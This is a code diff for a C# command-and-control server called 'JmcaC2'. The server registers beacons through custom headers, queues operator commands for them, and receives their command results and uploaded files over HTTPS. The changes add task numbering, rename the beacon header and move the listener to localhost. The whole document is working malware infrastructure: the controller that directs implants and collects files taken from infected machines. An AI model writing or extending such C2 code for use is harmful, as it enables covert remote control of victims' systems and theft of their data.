@@ -12,6 +12,7 @@ namespace JmcaC2
         static bool programRunning = true;
         static bool serverRunning = true;
         static int port = 27015;
+        static int taskIdx = 0;
 
 
         static List<BeaconClient> Beacons = new List<BeaconClient>();
@@ -32,7 +33,7 @@ namespace JmcaC2
             Console.WriteLine("Welcome to JmcaC2 Controller 🇯🇲");
 
             // setup the http listener
-            listener.Prefixes.Add($"https://192.168.1.100:{port}/");
+            listener.Prefixes.Add($"https://localhost:{port}/");
             listener.Start();
 
             Console.WriteLine($"HTTP Server started on port {port}");
@@ -140,8 +141,9 @@ namespace JmcaC2
                 Console.ForegroundColor = ConsoleColor.White;
                 return;
             }
-            BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
-            Console.WriteLine($"Added task for {CurrentBeacon.Name}");
+            BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, taskIdx, CmdPrefix, CmdArgs));
+            Console.WriteLine($"Added task #{taskIdx} for {CurrentBeacon.Name}");
+            taskIdx++;
         }
 
         static private string GenerateClientName()
@@ -253,10 +255,9 @@ namespace JmcaC2
                     if (request.HttpMethod == "GET")
                     {
 
-                        Console.WriteLine("Received Request", request);
                         // MAJOR WEWOO FIXED: use custom header with beacon name. if not exist,
                         // add new client with generated name
-                        string[]? values = request.Headers.GetValues("BeaconName");
+                        string[]? values = request.Headers.GetValues("Beacon-Name");
                         string beaconName = string.Empty;
                         if (values == null)
                         {
@@ -296,7 +297,7 @@ namespace JmcaC2
 
                         byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
                         response.ContentLength64 = buffer.Length;
-                        response.AddHeader("BeaconName", beaconName);
+                        response.AddHeader("Beacon-Name", beaconName);
                         var output = response.OutputStream;
                         output.Write(buffer, 0, buffer.Length);
                         output.Close();
@@ -305,12 +306,19 @@ namespace JmcaC2
                     else if (request.HttpMethod == "POST")
                     {
                         // Handle POST request for task results
-                        Console.WriteLine("Received POST request for task results");
+                        Console.WriteLine($"Received POST request for task results");
+                        string? taskIdx = context.Request.Headers["Task-Index"];
+                        if (taskIdx != null)
+                        {
+                            Console.WriteLine($"Task #{taskIdx} Results");
+                        }
+
                         if (context.Request.Url!.OriginalString.Contains("upload"))
                         {
-                            string? beaconName = context.Request.Headers["BeaconName"];
+                            string? beaconName = context.Request.Headers["Beacon-Name"];
                             string? fileName = context.Request.Headers["File-Name"];
                             string? fileLengthStr = context.Request.Headers["File-Length"];
+
                             if (fileName is null || fileLengthStr is null)
                             {
                                 Console.WriteLine("[-] Missing upload headers");
@@ -341,7 +349,7 @@ namespace JmcaC2
                             using (var reader = new System.IO.StreamReader(request.InputStream, request.ContentEncoding))
                             {
                                 string result = reader.ReadToEnd();
-                                Console.WriteLine("Task Result: " + result);
+                                Console.WriteLine(result);
                             }
                         }
                         response.StatusCode = (int)HttpStatusCode.OK;
